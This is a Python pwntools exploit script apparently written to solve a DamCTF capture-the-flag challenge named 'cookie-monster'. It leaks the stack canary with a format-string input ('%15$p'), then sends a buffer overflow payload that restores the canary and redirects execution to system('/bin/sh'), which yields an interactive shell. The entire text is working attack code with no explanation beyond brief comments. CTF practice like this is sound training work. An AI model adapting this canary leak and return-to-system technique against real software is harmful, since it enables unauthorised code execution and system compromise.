from pwn import *

p = process("./cookie-monster")
#p = remote("chals.damctf.xyz", 31312)
b = ELF("./cookie-monster")

sh = next(b.search(b"/bin/sh"))
print(f"sh: {hex(sh)}")

context.log_level = "debug"
libc = b.libc

a = p.recvuntil(":") # Enter your name:
print("[!] recvd: ", a)

p.sendline("%15$p") # $esp-15*8 = canary

resp = p.recvline() # Hello 0xabcdef

## Hello 0xabcdef
## 123456789abcde > canary starts on 9th char
canary_xstr = resp[9:]
print(canary_xstr)

# read as hex integer
canary = int(canary_xstr,16)
print(canary)
log.info("Canary: {}".format(hex(canary)))

p.recvuntil("?")


pld = b"A"*32 # pad choice buffer
pld += p32(canary) 
pld += b"B"*12          # pad junk until system parameter
pld += p32(0x804860c)   # system call @ bakery
pld += p32(sh)          # /bin/sh string 

p.sendline(pld)
p.interactive()